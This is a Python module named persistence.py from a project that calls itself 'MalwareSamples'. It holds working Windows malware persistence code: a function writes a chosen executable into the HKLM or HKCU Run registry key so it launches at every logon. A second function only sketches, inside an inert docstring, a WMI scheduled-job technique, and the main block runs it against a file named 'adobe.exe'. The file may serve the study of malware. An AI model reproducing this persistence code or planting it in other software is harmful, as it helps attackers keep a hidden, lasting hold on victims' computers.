"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   persistence.py
   ---
"""


from winreg import *
import datetime
from .utilities import has_admin





def software_Microsoft_Windows_CurrentVersion_Run(process_path, process_name):
    privs = has_admin()

    """Use HKLM run key if we have the priviledge to do so"""
    if privs[1] is True:
        reg_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)


    else:
        """Set to current user run key"""
        reg_path = "Software\Microsoft\Windows\CurrentVersion\Run"
        registry_key = OpenKey(HKEY_CURRENT_USER, reg_path, 0, KEY_WRITE)
        install = process_path.replace("/", "\\")
        SetValueEx(registry_key, process_name, 0, REG_SZ, install)
        CloseKey(registry_key)

def wmi_persist(executable_path):
    #year=None, month=None, day=None, hours=None, minutes=None, seconds=None, microseconds=None, timezone=None
    """
    c = wmi.WMI()
    malware = f"{executable_path}"
    one_minutes_time = datetime.datetime.now() + datetime.timedelta(minutes=1)
    job_id, result = c.Win32_ScheduledJob.Create(
        Command=r"cmd.exe ipconfig",
        StartTime=wmi.from_time(one_minutes_time, timezone=0)
    )
    x = 0
    """

if __name__ == "__main__":
    wmi_persist("C:\\Users\\jfarl\\Downloads\\adobe.exe")